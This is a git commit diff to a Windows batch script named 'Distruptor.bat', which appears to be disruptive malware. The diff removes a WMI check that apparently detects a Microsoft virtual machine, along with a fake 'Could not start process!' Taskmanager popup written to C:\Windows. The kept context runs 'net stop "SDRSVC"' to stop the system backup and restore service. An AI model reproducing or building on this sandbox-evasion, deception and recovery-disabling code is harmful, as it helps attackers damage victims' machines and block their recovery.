77550492ca8eb4a42e21738b915c8a6d29667f62
Chai <83523587+CPScript@users.noreply.github.com>
2023-05-08 12:52:01 -0400

    Update Distruptor.bat

--- simple/Distruptor.bat
+++ simple/Distruptor.bat
@@ -3,24 +3,6 @@ title Simple Distruptor
 FOR /F "tokens=* USEBACKQ" %%F IN (`PowerShell.exe -command " (gwmi Win32_BaseBoard).Manufacturer -eq 'Microsoft Corporation' "`) DO (
 SET check=%%F
 )
-echo %check%
-
-if %check% == False (
-    echo Dim WshShell, BtnCode>C:\Windows\ifvm.vbs
-    echo Set WshShell = WScript.CreateObject("WScript.Shell")>>C:\Windows\ifvm.vbs
-    echo BtnCode = WshShell.Popup("Could not start process!",2+48,"Taskmanager")>>C:\Windows\ifvm.vbs
-    echo Select Case BtnCode>>C:\Windows\ifvm.vbs
-    echo case 3 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
-    echo case 4 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
-    echo case 5 WScript.Echo "ERROR">>C:\Windows\ifvm.vbs
-    echo End Select>>C:\Windows\ifvm.vbs
-    start C:\Windows\ifvm.vbs
-    pause
-    exit
-    
-    
-    
-    
     
 
 net stop "SDRSVC"
